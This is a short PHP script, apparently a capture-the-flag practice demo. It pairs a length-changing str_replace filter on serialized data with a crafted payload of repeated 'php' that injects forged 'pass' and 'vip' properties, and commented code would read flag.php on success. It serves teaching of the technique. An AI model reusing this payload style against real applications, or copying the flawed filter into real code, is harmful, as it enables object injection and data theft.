<?php

function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
}
$param= '123phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:3:"456";s:3:"vip";b:0;}';
$pass = '456';
$param  = serialize(new test($param,$pass));
$param2 =  filter($param);

echo $param;
echo "\n------------------\n";
echo $param2;

/*
$profile=unserialize($param2);


if ($profile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
*/
?>